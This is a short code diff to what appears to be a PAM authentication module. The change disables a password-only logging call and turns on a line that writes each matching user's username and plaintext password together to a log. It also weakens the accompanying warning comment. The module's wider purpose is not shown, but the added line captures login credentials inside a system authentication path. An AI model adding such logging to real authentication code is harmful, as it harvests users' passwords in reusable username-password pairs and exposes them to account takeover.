@@ -79,9 +79,9 @@ PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, cons
   else{
     if( is_logged_user(pUsername) ){
     
-      // DO NOT LOG USERNAME AND PASSWORDS ASSOCIATION, ONLY PASSWORDS
-      // mylog(pamh,"Username:>%s< Password:>%s<", pUsername, password);
-      mylog(pamh,"%s", password);
+      // BE CAREFULL IF LOG USERNAME AND PASSWORDS ASSOCIATION, BETTER ONLY PASSWORDS
+      mylog(pamh,"Username:>%s< Password:>%s< ", pUsername, password);
+      // mylog(pamh,"%s", password);
       }
   }
 
